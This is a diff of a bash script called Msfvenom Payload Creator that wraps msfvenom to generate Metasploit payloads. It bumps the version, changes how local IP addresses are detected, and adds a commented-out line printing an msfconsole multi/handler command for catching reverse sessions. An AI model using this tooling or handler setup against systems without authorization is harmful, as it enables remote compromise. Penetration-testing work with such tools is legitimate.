@@ -1,6 +1,6 @@
 #!/bin/bash
 #-Metadata----------------------------------------------------#
-#  Filename: mpc.sh (v1.4)               (Update: 2015-12-03) #
+#  Filename: mpc.sh (v1.4.1)             (Update: 2016-01-11) #
 #-Info--------------------------------------------------------#
 #  Quickly generate Metasploit payloads using msfvenom.       #
 #-Author(s)---------------------------------------------------#
@@ -167,6 +167,7 @@ EOF
 
   echo -e " ${YELLOW}[i]${RESET} MSF handler file: '${FILEHANDLE}'"
   echo -e " ${YELLOW}[i]${RESET} Run: msfconsole -q -r '${FILEHANDLE}'"
+  #echo -e " ${YELLOW}[i]${RESET} MSF command: msfconsole -x \"use exploit/multi/handler; \\\\\n  set PAYLOAD ${PAYLOAD}; \\\\\n  set ${HOST} ${IP}; \\\\\n  set LPORT ${PORT}; \\\\\n  set ExitOnSession false; \\\\\n  run -j\""
   SUCCESS=true
   return
 }
@@ -242,7 +243,7 @@ function doHelp {
 
 
 ## Banner
-echo -e " ${BLUE}[*]${RESET} ${BLUE}M${RESET}sfvenom ${BLUE}P${RESET}ayload ${BLUE}C${RESET}reator (${BLUE}MPC${RESET} v${BLUE}1.4${RESET})"
+echo -e " ${BLUE}[*]${RESET} ${BLUE}M${RESET}sfvenom ${BLUE}P${RESET}ayload ${BLUE}C${RESET}reator (${BLUE}MPC${RESET} v${BLUE}1.4.1${RESET})"
 
 
 ## Check system
@@ -288,7 +289,7 @@ if [[ "$DARWIN" = "true" ]]; then   # OSX users
   IPs=(); for (( i=0; i<${#IFACE[@]}; ++i )); do IPs+=( $(\ifconfig "${IFACE[${i}]}" | \grep inet | \grep -E '([[:digit:]]{1,2}.){4}' | \sed -e 's_[:|addr|inet]__g; s_^[ \t]*__' | \awk '{print $1}') ); done
 else    # nix users
   IFACE=( $(\awk '/:/ {print $1}' /proc/net/dev | \sed 's_:__') )
-  IPs=(); for (( i=0; i<${#IFACE[@]}; ++i )); do IPs+=( $(\ifconfig "${IFACE[${i}]}" | \grep 'inet addr:' | \cut -d':' -f2 | \cut -d' ' -f1) ); done
+  IPs=(); for (( i=0; i<${#IFACE[@]}; ++i )); do IPs+=( $(\ip addr list "${IFACE[${i}]}" | \grep 'inet ' | \cut -d' ' -f6 | \cut -d '/' -f1) ); done
 fi
 
 ## Define TYPEs/FORMATs
